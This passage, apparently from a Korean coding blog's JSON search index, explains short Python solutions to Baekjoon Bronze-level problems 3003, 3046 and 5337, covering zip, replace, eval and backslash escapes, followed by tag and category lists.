변경하겠다. 1print( *[ int(j) - int(i) for i, j in zip(input().split(),&quot;112228&quot;) ] ) 문자열 자료형Link : https://wikidocs.net/13 왜 for문에 문자열을 넣었는지 이해가 안된다면, 점프 투 파이썬을 참고하면 된다.읽어보면 파이썬이 문자열에서 지원하는 기능을 보면 리스트와 별 차이가 없다는 것을 알 수 있다. 1[print(i) for i in '112228'] zipLink : https://wikidocs.net/32#zip 12a = zip([1, 2, 3], [4, 5, 6])print(*a) # 출력 : (1, 4) (2, 5) (3, 6) 이와 같이 zip은 동일한 개수로 이루어진 자료형을 묶어 주는 함수이다.이것을 이용하여 문제 풀이에선 체스 말의 개수와 사용자 입력 값을 하나씩 묶어서 변수에 넣어 줄 수 있었다. 123456789for i, j in zip(input().split(), '112228'): print('체스말 : ', i, '사용자 입력 : ', j)# 체스말 : 0 사용자 입력 : 1# 체스말 : 1 사용자 입력 : 1# 체스말 : 2 사용자 입력 : 2# 체스말 : 2 사용자 입력 : 2# 체스말 : 2 사용자 입력 : 2# 체스말 : 7 사용자 입력 : 8","link":"/2020/12/05/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%885-3003%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈5 - 3046번 문제","text":"백준 3046번 문제R2Link : https://www.acmicpc.net/problem/3046 12a, b = map(int, input().split())print(2*b - a) 간단하게 문제 풀이를 했으나, 역시 좀 아쉽다.좀 더 python스럽게 변경하였다. 1print(-eval(input().replace(&quot; &quot;,&quot;-2*&quot;))) replaceLink : https://wikidocs.net/13#replace 12s = 'Hi! _님'print(s.replace('_', 'LRTK')) # 출력 : Hi! LRTK님 이와 같이 특정 단어를 치환해주는 것이 replace함수이다.위 문제 풀이에선 입력된 ‘11 15’을 ‘11-2*15’로 변환하여 eval함수를 사용하여 계산하였다. eval함수는 정리한 부분은 백준 브론즈5 1000번 문제에서 다루었으니 궁금하면 찾아서 보면 된다.","link":"/2020/12/05/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%885-3046%EB%B2%88-%EB%AC%B8%EC%A0%9C/"},{"title":"백준 브론즈5 - 5337번 문제","text":"백준 5337번 문제웹컴Link : https://www.acmicpc.net/problem/5337 1print('. . .\\n| | _ | _. _ ._ _ _\\n|/\\|(/.|(_.(_)[ | )(/.') 이 문제는 파이썬을 처음 접한 분에게 파이썬의 print 주의점을 알려주기 위한 문제로 파악이 된다. 123# \\nsi 출략print('\\nsi') # 출력 : siprint('\\\\nsi') # 출력 : \\nsi 파이썬에서는 \\를 출력하기 위해 \\\\로 변경해줘야 한다.이러한 이유는 위의 코드처럼 ‘\\n’과 같은 특수 문자와 구별하려고 이러한 방법을 사용한다.","link":"/2020/12/05/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%885-5337%EB%B2%88-%EB%AC%B8%EC%A0%9C/"}],"tags":[{"name":"BeeBox","slug":"BeeBox","link":"/tags/BeeBox/"},{"name":"백준","slug":"백준","link":"/tags/%EB%B0%B1%EC%A4%80/"},{"name":"백준 브론즈4","slug":"백준-브론즈4","link":"/tags/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/"},{"name":"baekjoon","slug":"baekjoon","link":"/tags/baekjoon/"},{"name":"backjoon bronze4","slug":"backjoon-bronze4","link":"/tags/backjoon-bronze4/"},{"name":"backjoon","slug":"backjoon","link":"/tags/backjoon/"},{"name":"백준 브론즈5","slug":"백준-브론즈5","link":"/tags/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%885/"},{"name":"backjoon bronze5","slug":"backjoon-bronze5","link":"/tags/backjoon-bronze5/"},{"name":"baekjoon bronze4","slug":"baekjoon-bronze4","link":"/tags/baekjoon-bronze4/"}],"categories":[{"name":"Security","slug":"Security","link":"/categories/Security/"},{"name":"Web","slug":"Security/Web","link":"/categories/Security/Web/"},{"name":"PHP","slug":"Security/Web/PHP","link":"/categories/Security/Web/PHP/"},{"name":"알고리즘","slug":"알고리즘","link":"/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/"},{"name":"BeeBox","slug":"Security/Web/PHP/BeeBox","link":"/categories/Security/Web/PHP/BeeBox/"},{"name":"백준","slug":"알고리즘/백준","link":"/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/"},{"name":"백준 브론즈4","slug":"알고리즘/백준/백준-브론즈4","link":"/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%884/"},{"name":"백준 브론즈5","slug":"알고리즘/백준/백준-브론즈5","link":"/categories/%EC%95%8C%EA%B3%A0%EB%A6%AC%EC%A6%98/%EB%B0%B1%EC%A4%80/%EB%B0%B1%EC%A4%80-%EB%B8%8C%EB%A1%A0%EC%A6%885/"}]}